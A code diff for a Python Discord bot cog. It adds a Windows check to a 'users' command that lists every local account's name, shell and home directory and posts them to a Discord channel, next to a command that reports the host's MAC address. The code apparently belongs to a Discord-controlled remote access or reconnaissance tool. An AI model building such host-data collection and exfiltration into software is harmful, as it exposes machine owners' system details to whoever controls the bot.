@@ -123,35 +123,38 @@ Mac Address: `{':'.join(re.findall('..','%012x' % uuid.getnode()))}`
 
     @commands.command()
     async def users(self, ctx):
+        if os.name == 'nt':
+            # https://stackoverflow.com/questions/56300490/how-to-get-all-windows-linux-user-and-not-only-current-user-with-python
+            pass
+        else:
+            # Users
+            try:
+                final_users_text = "`Name` **|** `Shell` **|** `Dir`\n"
+                users = pwd.getpwall()
+                for user in users:
+                    final_users_text += f'{user.pw_name} | {user.pw_shell} | {user.pw_dir}\n'
 
-        # Users
-        try:
-            final_users_text = "`Name` **|** `Shell` **|** `Dir`\n"
-            users = pwd.getpwall()
-            for user in users:
-                final_users_text += f'{user.pw_name} | {user.pw_shell} | {user.pw_dir}\n'
+                for chunk in textwrap.wrap(final_users_text, 4096, replace_whitespace=False):
+                    embed = discord.Embed(
+                        title=f"Users List of {getpass.getuser()}'s computer",
+                        description=chunk,
+                        timestamp=datetime.utcnow(),
+                        color=0xFF5733
+                    )
+                    embed.set_thumbnail(
+                        url="https://cdn.discordapp.com/attachments/877796755234783273/966386389249818704/unknown.png")
+                    await ctx.send(embed=embed)
 
-            for chunk in textwrap.wrap(final_users_text, 4096, replace_whitespace=False):
-                embed = discord.Embed(
-                    title=f"Users List of {getpass.getuser()}'s computer",
-                    description=chunk,
-                    timestamp=datetime.utcnow(),
-                    color=0xFF5733
-                )
-                embed.set_thumbnail(
-                    url="https://cdn.discordapp.com/attachments/877796755234783273/966386389249818704/unknown.png")
-                await ctx.send(embed=embed)
+                    embed.set_footer(
+                        text=f'Requested by {ctx.author.name}',
+                        icon_url=ctx.author.avatar_url
+                    )
+                    await ctx.send(embed=embed)
 
-                embed.set_footer(
-                    text=f'Requested by {ctx.author.name}',
-                    icon_url=ctx.author.avatar_url
-                )
-                await ctx.send(embed=embed)
-
-            return
-        except Exception as e:
-            await ctx.send(str(e))
-            return
+                return
+            except Exception as e:
+                await ctx.send(str(e))
+                return
 
 
 def setup(client: commands.Bot):
